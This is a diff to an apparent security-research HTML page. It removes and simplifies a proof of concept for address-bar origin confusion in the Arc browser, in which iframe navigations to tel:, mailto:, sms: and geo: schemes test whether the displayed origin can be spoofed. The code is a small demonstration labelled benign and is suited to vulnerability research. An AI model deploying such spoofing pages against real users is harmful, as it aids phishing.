@@ -1,33 +1,8 @@
 <!DOCTYPE html><html><body>
-<h1>Arc origin-confusion PoC (benign)</h1>
-<p>Top-level origin: <b id="o"></b> — attacker-controlled content</p>
-
-<div>
-  <button onclick="trigger('tel:+100000000')">tel:</button>
-  <button onclick="trigger('mailto:umarzaidridwan11@gmail.com')">mailto:</button>
-  <button onclick="trigger('sms:+100000000')">sms:</button>
-  <button onclick="trigger('geo:0,0')">geo:</button>
-</div>
-
-<iframe id="f" style="width:320px;height:90px;border:1px solid #ccc"></iframe>
-<pre id="log"></pre>
-
-<script>
-  // Origin kedua (domain uji Anda sendiri) yang ingin diuji muncul di address bar:
-  var IFRAME_ORIGIN = "https://intanjelek.github.io/spoof/iframe.html";
-  var log = function(m){ document.getElementById('log').textContent += m + '\n'; };
-  document.getElementById('o').textContent = location.origin;
-
-  var f = document.getElementById('f');
-  f.src = IFRAME_ORIGIN;
-  f.onload = function(){ log('iframe loaded: ' + IFRAME_ORIGIN); };
-
-  function trigger(scheme){
-    // parent menavigasi subframe ke URI scheme (lintas-origin diizinkan)
-    try {
-      f.src = scheme;
-      log('iframe -> ' + scheme + '  — PERHATIKAN ADDRESS BAR sekarang');
-    } catch(e){ log('nav err: ' + e); }
-  }
-</script>
+<h1>RENDERED top-level = origin A</h1>
+<p>Top-level origin: <b id="o"></b></p>
+<p>This document stays visible/rendered the whole time.</p>
+<iframe id="f" src="https://intanjelek.github.io/spoof/iframe.html"
+        style="width:340px;height:170px;border:2px solid #c00"></iframe>
+<script>document.getElementById('o').textContent = location.origin;</script>
 </body></html>
